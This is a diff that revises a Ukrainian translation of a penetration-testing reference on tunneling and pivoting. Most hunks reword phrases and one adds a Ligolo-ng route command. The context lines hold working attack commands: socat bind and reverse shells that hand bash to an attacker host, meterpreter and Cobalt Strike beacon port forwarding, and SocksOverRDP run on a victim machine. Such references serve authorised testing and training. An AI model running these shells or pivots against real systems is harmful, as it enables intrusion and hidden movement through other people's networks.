@@ -18,7 +18,7 @@ Learn & practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data
 ## Nmap tip
 
 {% hint style="warning" %}
-**ICMP** та **SYN** сканування не можуть бути тунельовані через проксі socks, тому ми повинні **вимкнути виявлення ping** (`-Pn`) і вказати **TCP сканування** (`-sT`), щоб це працювало.
+**ICMP** та **SYN** сканування не можуть бути тунельовані через проксі socks, тому ми повинні **вимкнути пінг-дослідження** (`-Pn`) і вказати **TCP сканування** (`-sT`), щоб це працювало.
 {% endhint %}
 
 ## **Bash**
@@ -41,7 +41,7 @@ evil-winrm -u username -i Jump
 ```
 ## **SSH**
 
-Графічне з'єднання SSH (X)
+SSH графічне з'єднання (X)
 ```bash
 ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
 ```
@@ -118,7 +118,7 @@ sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
 
 ### Port2Port
 
-Локальний порт --> Скомпрометований хост (активна сесія) --> Третій\_бокс:Порт
+Локальний порт --> Скомпрометований хост (активна сесія) --> Третя\_коробка:Порт
 ```bash
 # Inside a meterpreter session
 portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
@@ -148,7 +148,7 @@ echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
 
 ### SOCKS proxy
 
-Відкрийте порт на сервері команди, що прослуховує на всіх інтерфейсах, який можна використовувати для **маршрутизації трафіку через маяк**.
+Відкрийте порт на teamserver, який слухає на всіх інтерфейсах, що може бути використаний для **маршрутизації трафіку через beacon**.
 ```bash
 beacon> socks 1080
 [+] started SOCKS4a server on: 1080
@@ -174,7 +174,7 @@ To note:
 ### rPort2Port local
 
 {% hint style="warning" %}
-У цьому випадку **порт відкривається на хості beacon**, а не на Team Server, і **трафік надсилається до клієнта Cobalt Strike** (не до Team Server), а звідти до вказаного хосту:порту
+У цьому випадку **порт відкритий на хості beacon**, а не на Team Server, і **трафік надсилається до клієнта Cobalt Strike** (не до Team Server), а звідти до вказаного хосту:порту
 {% endhint %}
 ```
 rportfwd_local [bind port] [forward host] [forward port]
@@ -243,6 +243,12 @@ listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
 # Display the currently running listeners on the agent -- Attacker
 listener_list
 ```
+### Доступ до локальних портів агента
+```bash
+# Establish a tunnel from the proxy server to the agent
+# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
+interface_add_route --name "ligolo" --route 240.0.0.1/32
+```
 ## Rpivot
 
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
@@ -273,7 +279,7 @@ victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntl
 victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
 attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
 ```
-### Реверс-шелл
+### Зворотний шелл
 ```bash
 attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
 victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
@@ -322,7 +328,7 @@ victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.
 ```
 ### Remote Port2Port
 
-Підключіть локальний SSH порт (22) до порту 443 атакуючого хоста
+Підключіть локальний SSH порт (22) до порту 443 хоста атакуючого
 ```bash
 attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
 victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
@@ -353,10 +359,10 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-Вам потрібно мати **доступ до RDP через систему**.\
+Вам потрібно мати **доступ RDP до системи**.\
 Завантажте:
 
-1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Цей інструмент використовує `Dynamic Virtual Channels` (`DVC`) з функції Remote Desktop Service Windows. DVC відповідає за **тунелювання пакетів через RDP з'єднання**.
+1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Цей інструмент використовує `Dynamic Virtual Channels` (`DVC`) з функції Remote Desktop Service в Windows. DVC відповідає за **тунелювання пакетів через RDP з'єднання**.
 2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)
 
 На вашому клієнтському комп'ютері завантажте **`SocksOverRDP-Plugin.dll`** ось так:
@@ -364,7 +370,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 # Load SocksOverRDP.dll using regsvr32.exe
 C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
-Тепер ми можемо **підключитися** до **жертви** через **RDP** за допомогою **`mstsc.exe`**, і ми повинні отримати **підказку**, що **плагін SocksOverRDP увімкнено**, і він буде **слухати** на **127.0.0.1:1080**.
+Тепер ми можемо **підключитися** до **жертви** через **RDP**, використовуючи **`mstsc.exe`**, і ми повинні отримати **підказку**, що **плагін SocksOverRDP увімкнено**, і він буде **слухати** на **127.0.0.1:1080**.
 
 **Підключіться** через **RDP** та завантажте і виконайте на машині жертви бінарний файл `SocksOverRDP-Server.exe`:
 ```
@@ -378,7 +384,7 @@ netstat -antb | findstr 1080
 
 ## Проксування Windows GUI додатків
 
-Ви можете налаштувати Windows GUI додатки на проксування через проксі, використовуючи [**Proxifier**](https://www.proxifier.com/).\
+Ви можете налаштувати Windows GUI додатки для роботи через проксі, використовуючи [**Proxifier**](https://www.proxifier.com/).\
 У **Профіль -> Проксі-сервери** додайте IP-адресу та порт SOCKS сервера.\
 У **Профіль -> Правила проксування** додайте назву програми для проксування та з'єднання з IP-адресами, які ви хочете проксувати.
 
@@ -452,7 +458,7 @@ listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this b
 ```
 #### Зміна DNS у proxychains
 
-Proxychains перехоплює виклик `gethostbyname` libc і тунелює tcp DNS запит через socks проксі. За **замовчуванням** DNS сервер, який використовує proxychains, це **4.2.2.2** (жорстко закодований). Щоб змінити його, відредагуйте файл: _/usr/lib/proxychains3/proxyresolv_ і змініть IP. Якщо ви в **середовищі Windows**, ви можете встановити IP **контролера домену**.
+Proxychains перехоплює виклик `gethostbyname` libc і тунелює tcp DNS запит через socks проксі. За **замовчуванням** DNS сервер, який використовує proxychains, є **4.2.2.2** (жорстко закодований). Щоб змінити його, відредагуйте файл: _/usr/lib/proxychains3/proxyresolv_ і змініть IP. Якщо ви в **середовищі Windows**, ви можете встановити IP **контролера домену**.
 
 ## Тунелі в Go
 
